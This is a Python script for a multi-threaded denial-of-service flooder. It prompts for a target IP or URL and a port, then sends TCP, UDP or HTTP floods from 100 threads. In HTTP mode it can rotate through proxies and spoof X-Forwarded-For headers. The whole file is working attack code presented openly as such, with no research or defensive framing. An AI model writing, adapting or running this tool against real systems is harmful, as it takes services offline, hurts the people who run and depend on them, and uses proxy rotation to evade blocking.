import threading
import socket
import random
import time
import requests

# ---------- USER INPUTS ----------
target = input("Enter the target IP/URL: ")  # IP or domain
port = int(input("Enter the target port: "))  # 80 for HTTP

protocols = ["TCP", "UDP", "HTTP"]
protocol_choice = input(f"Select protocol {protocols}: ").upper()

# Optional proxy support for HTTP
proxy_file = input("Enter proxy list file (or leave blank to skip proxies): ").strip()

proxy_list = []
if proxy_file:
    with open(proxy_file, 'r') as f:
        proxy_list = [line.strip() for line in f if line.strip()]

already_attacked = 0

# ---------- FUNCTIONS ----------

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def tcp_flood():
    global already_attacked
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(str.encode("GET / HTTP/1.1\r\nHost: " + random_ip() + "\r\n\r\n"))
            s.close()
            already_attacked += 1
        except:
            pass

        if already_attacked % 100 == 0:
            print(f"[TCP] Packets sent: {already_attacked} to {target}:{port}")

def udp_flood():
    global already_attacked
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024)
            s.sendto(data, (target, port))
            s.close()
            already_attacked += 1
        except:
            pass

        if already_attacked % 100 == 0:
            print(f"[UDP] Packets sent: {already_attacked} to {target}:{port}")

def http_flood():
    global already_attacked
    while True:
        try:
            proxy = None
            if proxy_list:
                proxy_ip = random.choice(proxy_list)
                proxy = {"http": f"http://{proxy_ip}", "https": f"http://{proxy_ip}"}
            headers = {
                "User-Agent": f"FakeBot/{random.randint(1,10)}",
                "X-Forwarded-For": random_ip()
            }
            requests.get(f"http://{target}", headers=headers, proxies=proxy, timeout=5)
            already_attacked += 1
        except:
            pass

        if already_attacked % 100 == 0:
            print(f"[HTTP] Requests sent: {already_attacked} to {target}")

# ---------- THREADING ----------

def start_attack():
    if protocol_choice == "TCP":
        attack_func = tcp_flood
    elif protocol_choice == "UDP":
        attack_func = udp_flood
    elif protocol_choice == "HTTP":
        attack_func = http_flood
    else:
        print("Invalid protocol selected.")
        return

    for i in range(100):  # Adjust number of threads
        t = threading.Thread(target=attack_func)
        t.daemon = True
        t.start()
        print(f"[+] Thread {i+1} started.")

    # Keep running
    while True:
        time.sleep(1)

# ---------- RUN ----------
start_attack()
